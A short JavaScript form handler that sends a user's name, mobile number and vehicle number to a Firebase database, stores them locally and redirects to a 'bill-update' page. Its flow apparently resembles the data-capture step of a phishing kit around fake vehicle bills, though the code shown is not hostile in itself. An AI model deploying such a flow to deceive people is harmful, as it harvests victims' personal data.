document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  // ✅ Generate and store session key only once
  let userKey = localStorage.getItem("userSessionKey");
  if (!userKey) {
    userKey = firebase.database().ref("ududip007").push().key;
    localStorage.setItem("userSessionKey", userKey);
  }

  // ✅ Firebase reference to current user's session node
  const ref = firebase.database().ref("ududip007/" + userKey);

  // ✅ Collect form data
  var aname = document.getElementById("aname").value;
  var bmobile = document.getElementById("bmobile").value;
  var cac = document.getElementById("cac").value.toUpperCase();

  // ✅ Set data to this user's session node
  ref.set({
    a_NAME: aname,
    b_MOBILE: bmobile,
    c_vehicle: cac
  }).then(() => {
    localStorage.setItem("vehicleNumber", cac); // ✅ Save vehicle number
    localStorage.setItem("fullName", aname);     // ✅ Save name
    window.location.href = "bill-update.html";   // ✅ Redirect to next step
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
